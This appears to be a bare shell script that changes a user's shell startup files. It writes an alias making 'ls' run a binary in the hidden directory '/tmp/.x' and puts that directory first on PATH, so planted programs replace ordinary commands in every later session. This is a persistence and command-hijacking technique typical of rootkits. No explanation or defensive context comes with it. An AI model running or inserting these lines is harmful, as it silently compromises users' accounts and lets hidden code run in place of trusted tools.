#!/bin/sh
echo 'alias ls="/tmp/.x/ls"' >> ~/.bashrc
echo 'export PATH=/tmp/.x:$PATH' | tee -a "$HOME/.zshrc"
